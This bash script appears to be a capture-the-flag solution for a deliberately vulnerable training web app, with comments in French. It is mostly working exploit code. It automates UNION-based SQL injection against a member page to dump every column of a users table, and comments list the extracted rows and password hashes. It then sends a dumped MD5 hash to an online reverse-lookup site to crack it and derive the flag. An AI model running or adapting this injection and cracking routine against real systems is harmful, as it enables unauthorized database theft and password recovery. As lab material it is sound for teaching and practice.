#!/bin/bash
#
# ./get-the-forty-two-flag.sh "ip"
# 

# table SQL récupérée lors de l'injection initiale ip_darkly/index.php?page=member&Submit=Submit&id=1 and 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
table="Member_Sql_Injection.users"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

function md5_reverse_decode_to_string
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: md5 to reverse
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

function string_encode_to_md5
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: string to md5
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?" | grep -Eo "<input class=\"field\" id=\"form_hash_to_string_hash\" type=\"search\" name=\"md5\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

echo -e "\n\033[35m2. === ${table} ===============================================\033[0m\n"

# Member_Sql_Injection.users (user_id, first_name, last_name, town, country, planet, Commentaire, countersign)
# On constate qu'il y a 4 membres dans le SGBD, si on range les datas selon les
# cols, on obtient 
# 1: one	me		Paris		France		EARTH	Je pense, donc je suis	2b3366bcfd44f540e630d4dc2b9b06d9
# 2: two	me		Helsinki	Finlande	Earth	Aamu on iltaa viisaampi	60e9032c586fb422e2c16dee6286cf10
# 3: three	me		Dublin		Irlande		Earth	Dublin is a city of stories and secrets.	e083b24a01c483437bcf4a9eea7c1b4d
# 5: Flag	GetThe	42			42			42		Decrypt this password -> then lower all the char. Sh256 on it and it's good !	5ff9d0165b4f92b14994e5c685cdce28
declare -a cols=("first_name" "last_name" "town" "country" "planet" "Commentaire" "countersign")
declare -a get_the_flag=()
let "i=0"

echo -e "We want to penetrate into SGBD inside \033[33m${table}\033[0m\n"
for col in "${cols[@]}"
do
	get_the_flag[$i]=`simplified_curl_request "${1}/index.php?page=member&Submit=Submit" "id=1 AND 1=2 UNION SELECT user_id, ${col} FROM ${table}" | grep -Eo "((First |Sur)name[^<]*)*" | tr "\n" " " | awk -F: '{print $NF}'`
	let "i++"
done

# Decrypt the flag by http
let "last_idx=(( ${#get_the_flag[@]} - 1 ))"
flag=`echo "${get_the_flag[$last_idx]}" | awk '{print $1}'`
flag=`md5_reverse_decode_to_string "${flag}" | awk '{print tolower($NF)}' | shasum -a 256 | awk '{print $1}'`
echo -ne "\nWe have retrieved this data form our penetration"
for data in "${get_the_flag[@]}"
do
	echo -ne "\t\033[33m${data}\033[0m "
done
echo -e "\nFlag earned with SQL UNION Injection on ${table} table\n\033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${table} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
